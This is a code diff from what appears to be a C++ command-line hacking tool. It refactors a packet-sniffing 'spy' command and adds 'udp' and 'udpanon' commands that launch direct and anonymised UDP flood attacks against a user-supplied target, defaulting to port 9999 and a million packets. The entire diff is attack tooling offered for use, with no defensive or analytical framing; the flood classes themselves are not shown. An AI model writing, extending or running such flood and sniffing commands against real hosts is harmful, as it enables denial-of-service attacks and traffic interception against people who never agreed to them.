@@ -193,32 +193,31 @@ int processCommand(int i) {
 				cout << "Improperly formatted command; format: \"hack spy -i <interface> -c <packets> [--lm]\"" << endl;
 				return 0;
 			}
-			pktd::PacketDissector dsctr(interface);
-			cout << "Initializing spying.\n  Interface name: " << interface << endl;
-			cout << "  Desired number of packets: " << pktCount << " packets";
-			cout << endl;
-			cout << "  Interface connection: " << colors::colorize("ARMED", colors::OKGREEN) << endl;
-			data::Bytes rawData;
-			bool go = false;
-			if (cmdContains("--lm")) { go = true; } else { go = notif::confirm(); }
-			if (go) {
-				cout << "Spying on " << interface << " ..." << endl;
-
-				int i = pktCount;
-				while (i --> 0) {
-					cout << dsctr.receivePacket().repr() << endl;
-				}
-			}
-			cout << "Spying operation complete." << endl;
+			probe::spy(interface, pktCount, cmdContains("--lm"));
 		} else if (cmd[1] == "udp") {
 			string target = getStringArg("-t");
 			int count = getIntArg("-c");
+			int port = getIntArg("-p");
 			if (target == "NONE") {
 				cout << "No target selected." << endl;
 				return 0;
 			}
+			if (port == -1) { port = 9999; }
 			if (count == -1) { count = 1000000; }
-
+			incision::DirectUDPFlood atk(target, port, incision::defaultPayload, cmdContains("--lm"), cmdContains("--hp"));
+			atk.attack();
+		} else if (cmd[1] == "udpanon") {
+			string target = getStringArg("-t");
+			int count = getIntArg("-c");
+			int port = getIntArg("-p");
+			if (target == "NONE") {
+				cout << "No target selected." << endl;
+				return 0;
+			}
+			if (port == -1) { port = 9999; }
+			if (count == -1) { count = 1000000; }
+			incision::AnonymousUDPFlood atk(target, port, incision::defaultPayload, cmdContains("--lm"), cmdContains("--hp"));
+			atk.attack();
 		} else {
 			notif::error("Unknown or invalid hack type.");
 		}
